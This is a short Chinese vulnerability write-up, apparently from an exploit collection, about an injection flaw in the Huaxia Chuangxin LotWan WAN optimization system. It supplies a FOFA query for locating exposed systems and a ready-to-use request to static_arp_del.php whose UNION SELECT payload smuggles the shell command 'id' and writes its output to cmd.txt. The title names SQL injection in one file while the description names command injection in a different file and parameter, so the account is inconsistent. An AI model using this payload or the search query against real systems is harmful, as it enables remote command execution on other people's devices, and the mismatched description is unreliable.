# 华夏创新 LotWan广域网优化系统 static\_arp\_del.php SQL注入漏洞

## 漏洞描述

华夏创新 LotWan广域网优化系统check\_instance\_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞

## 漏洞影响

```plain
华夏创新 LotWan广域网优化系统
```

## FOFA

```plain
title="LotWan 广域网优化系统"
```

## 漏洞复现

登录页面

![202205191829394.png](/uploads/20260518/82fe31b9-983d-4c1b-b503-19fd702dc5e4.png)

```plain
/acc/bindipmac/static_arp_del.php?x=1&arpName=1' and 0 union select 1,'||id>cmd.txt||',3,4,5,6,7,8--
```
